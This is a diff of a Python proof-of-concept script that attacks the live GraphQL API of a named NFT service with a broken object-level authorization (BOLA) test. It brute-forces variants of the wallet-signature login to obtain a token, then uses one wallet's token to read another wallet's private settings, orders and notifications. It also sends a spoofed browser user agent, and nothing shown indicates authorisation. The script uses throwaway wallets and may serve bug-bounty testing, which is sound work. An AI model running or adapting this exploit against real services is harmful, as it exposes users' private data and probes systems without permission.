@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
-"""minted.network BOLA PoC - throwaway wallets, minimal traffic (~10 requests)."""
-import json, time, sys
+"""minted.network login variant matrix -> then BOLA test."""
+import json, time
 import requests
 from eth_account import Account
 from eth_account.messages import encode_defunct
+from eth_utils import to_checksum_address
 
 API = "https://api.minted.network/graphql"
 MSG_TMPL = (
@@ -19,6 +20,12 @@ MSG_TMPL = (
     "timestamp: {ts}"
 )
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
+LOGIN_Q = """mutation login($timestamp: Long!, $evmAddress: EvmAddress!, $signature: String!) {
+  login(input: {timestamp: $timestamp, evmAddress: $evmAddress, signature: $signature}) {
+    token
+    evmAddress
+  }
+}"""
 
 def gql(query, variables=None, token=None):
     h = {"Content-Type": "application/json", "User-Agent": UA,
@@ -27,35 +34,38 @@ def gql(query, variables=None, token=None):
         h["Authorization"] = f"Bearer {token}"
     r = requests.post(API, json={"query": query, "variables": variables or {}},
                       headers=h, timeout=30)
-    print(f"[HTTP {r.status_code}]", flush=True)
     try:
-        return r.json()
+        return r.status_code, r.json()
     except Exception:
-        print(r.text[:500]); return None
+        return r.status_code, {"raw": r.text[:300]}
 
-def login(wallet):
-    acct = Account.from_key(wallet)
-    addr = acct.address.lower()
-    ts = int(time.time() * 1000)  # ms; retry with seconds if rejected
-    msg = MSG_TMPL.format(addr=addr, ts=ts)
-    sig = acct.sign_message(encode_defunct(text=msg)).signature.hex()
-    sig = sig if sig.startswith("0x") else "0x" + sig
-    q = """mutation login($timestamp: Long!, $evmAddress: EvmAddress!, $signature: String!) {
-  login(input: {timestamp: $timestamp, evmAddress: $evmAddress, signature: $signature}) {
-    token
-    evmAddress
-  }
-}"""
-    out = gql(q, {"timestamp": ts, "evmAddress": addr, "signature": "0x" + acct.sign_message(encode_defunct(text=msg)).signature.hex()[2:]})
-    if out and (out.get("errors") or not (out.get("data") or {}).get("login")):
-        print("ms-timestamp failed, retrying seconds:", json.dumps(out)[:300], flush=True)
-        ts = int(time.time())
-        msg = MSG_TMPL.format(addr=addr, ts=ts)
-        out = gql(q, {"timestamp": ts, "evmAddress": addr,
-                      "signature": "0x" + acct.sign_message(encode_defunct(text=msg)).signature.hex()})
-    tok = ((out or {}).get("data") or {}).get("login", {}).get("token")
-    print(f"LOGIN {addr} -> {'TOKEN OK (' + str(len(tok)) + ' chars)' if tok else json.dumps(out)[:300]}", flush=True)
-    return tok
+def sign(acct, msg):
+    return acct.sign_message(encode_defunct(text=msg)).signature.hex()
+
+def login_variants(key):
+    acct = Account.from_key(key)
+    cs = to_checksum_address(acct.address)
+    low = acct.address.lower()
+    now = int(time.time())
+    results = []
+    # variants: (addr_in_var, ts_value, addr_in_msg)
+    for name, av, ts, mv in [
+        ("cs+ms",   cs,  now*1000, cs.lower()),
+        ("cs+sec",  cs,  now,      cs.lower()),
+        ("low+ms",  low, now*1000, low),
+        ("cs+ms+msgCS", cs, now*1000, cs),
+        ("cs+sec+msgCS", cs, now, cs),
+    ]:
+        msg = MSG_TMPL.format(addr=mv, ts=ts)
+        sc, out = gql(LOGIN_Q, {"timestamp": ts, "evmAddress": av,
+                                "signature": sign(acct, msg)})
+        err = ((out.get("errors") or [{}])[0].get("message"))
+        tok = ((out.get("data") or {}).get("login") or {}).get("token")
+        results.append((name, err, tok))
+        print(f"VARIANT {name}: HTTP {sc} err={err} token={'YES' if tok else 'no'}", flush=True)
+        if tok:
+            return cs, tok
+    return cs, None
 
 Q_PRIV = """query getUserPrivateSetting($address: EvmAddress!) {
   user(address: $address) {
@@ -80,36 +90,18 @@ def show(tag, resp):
     print(f"### {tag}\n{json.dumps(resp)[:800]}\n", flush=True)
 
 def main():
-    a = Account.create().key.hex(); b = Account.create().key.hex()
-    wa = Account.from_key(a); wb = Account.from_key(b)
-    print(f"WALLET_A={wa.address}", flush=True)
-    print(f"WALLET_B={wb.address}", flush=True)
-
-    # 0. reachability / CF check
-    show("unauthenticated probe (__typename)",
-         gql("query { __typename }"))
-
-    ta = login(a)
-    tb = login(b)
-
-    # baseline: own data with own token
-    if ta:
-        show("BASELINE A-token -> privateSetting(A)",
-             gql(Q_PRIV, {"address": wa.address}, ta))
-        # THE TEST: attacker token A reading victim B's user-scoped data
-        show("BOLA TEST A-token -> privateSetting(B)",
-             gql(Q_PRIV, {"address": wb.address}, ta))
-        show("BOLA TEST A-token -> orders(B)",
-             gql(Q_ORDERS, {"address": wb.address, "first": 5}, ta))
-        show("BOLA TEST A-token -> notifications(B)",
-             gql(Q_NOTIF, {"address": wb.address, "first": 5}, ta))
-        # no-token comparison
-        show("NO-TOKEN -> privateSetting(B)",
-             gql(Q_PRIV, {"address": wb.address}))
-        show("B-token -> privateSetting(B) (victim self)",
-             gql(Q_PRIV, {"address": wb.address}, tb))
-    else:
-        print("LOGIN FAILED - aborting BOLA tests", flush=True)
+    ka = Account.create().key.hex(); kb = Account.create().key.hex()
+    ca, ta = login_variants(ka)
+    cb, tb = login_variants(kb)
+    print(f"WALLET_A={ca} tokenA={'YES' if ta else 'NO'}", flush=True)
+    print(f"WALLET_B={cb} tokenB={'YES' if tb else 'NO'}", flush=True)
+    if not ta:
+        print("LOGIN STILL FAILED - cannot run BOLA tests", flush=True); return
+    show("BASELINE A-token -> privateSetting(A)", gql(Q_PRIV, {"address": ca}, ta)[1])
+    show("BOLA TEST A-token -> privateSetting(B)", gql(Q_PRIV, {"address": cb}, ta)[1])
+    show("BOLA TEST A-token -> orders(B)", gql(Q_ORDERS, {"address": cb, "first": 5}, ta)[1])
+    show("BOLA TEST A-token -> notifications(B)", gql(Q_NOTIF, {"address": cb, "first": 5}, ta)[1])
+    show("NO-TOKEN -> privateSetting(B)", gql(Q_PRIV, {"address": cb})[1])
 
 if __name__ == "__main__":
     main()
